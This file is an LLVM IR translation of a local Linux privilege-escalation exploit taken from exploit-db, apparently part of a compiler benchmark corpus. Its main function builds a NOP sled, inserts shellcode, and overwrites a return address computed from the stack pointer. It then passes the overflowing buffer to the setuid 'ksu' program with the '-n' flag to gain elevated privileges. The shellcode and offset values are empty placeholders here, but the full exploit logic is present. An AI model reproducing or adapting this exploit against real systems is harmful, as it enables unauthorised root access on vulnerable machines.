; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19925.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19925.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@CODE_OFFSET = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@JMP_OFFSET = common dso_local global i32 0, align 4
@RET_OFFSET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [4 x i8] c"ksu\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = call i32 (...) @get_esp()
  store i32 %10, i32* %5, align 4
  %11 = load i32, i32* @LEN, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %8, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %9, align 8
  %15 = load i32, i32* @LEN, align 4
  %16 = call i32 @memset(i8* %14, i32 144, i32 %15)
  %17 = load i32, i32* @CODE_OFFSET, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %14, i64 %18
  %20 = load i32, i32* @shellcode, align 4
  %21 = load i32, i32* @shellcode, align 4
  %22 = call i32 @strlen(i32 %21)
  %23 = call i32 @memcpy(i8* %19, i32 %20, i32 %22)
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* @JMP_OFFSET, align 4
  %26 = add nsw i32 %24, %25
  %27 = load i64, i64* @RET_OFFSET, align 8
  %28 = getelementptr inbounds i8, i8* %14, i64 %27
  %29 = bitcast i8* %28 to i32*
  store i32 %26, i32* %29, align 1
  %30 = load i64, i64* @RET_OFFSET, align 8
  %31 = add i64 %30, 4
  %32 = getelementptr inbounds i8, i8* %14, i64 %31
  store i8 0, i8* %32, align 1
  %33 = call i32 @execlp(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %14, i32* null)
  %34 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %34)
  ret i32 0
}

declare dso_local i32 @get_esp(...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @execlp(i8*, i8*, i8*, i8*, i32*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
